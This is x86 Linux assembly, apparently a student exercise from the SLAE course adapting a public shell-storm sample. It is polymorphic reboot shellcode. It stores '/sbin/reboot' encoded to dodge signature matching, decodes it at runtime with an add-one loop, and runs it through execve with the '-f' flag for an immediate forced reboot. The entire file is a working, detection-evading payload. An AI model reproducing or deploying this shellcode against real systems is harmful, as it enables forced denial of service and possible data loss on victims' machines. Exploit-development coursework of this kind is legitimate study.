; Student:   SLAE-755
; Polymorphic reboot shellcode
; shell-storm.org/shellcode/files/shellcode-831.php

global _start			

section .text

_start:
	xor	 eax,eax
	push	 eax
	
	;toober/nibs/
	
	push	dword 0x736e6e61
	push	dword 0x64712e6d
	push	dword 0x6861722e

	

	mov	dl, 0xc
	mov	ebx,esp

	decode:
		mov cl, byte [ebx]
		add cl, 0x01
		mov byte [ebx], cl

		inc ebx
		dec dl
		cmp dl, al
		jnz short decode


	mov	ebx,esp
	push	eax

	;-f Force immediate halt
	push	word 0x662d

	mov	esi,esp
	push	eax
	push	esi
	push	ebx
	mov	ecx,esp

	;#define __NR_execve 11 syscall
	mov	 al,0xb
	int	 0x80
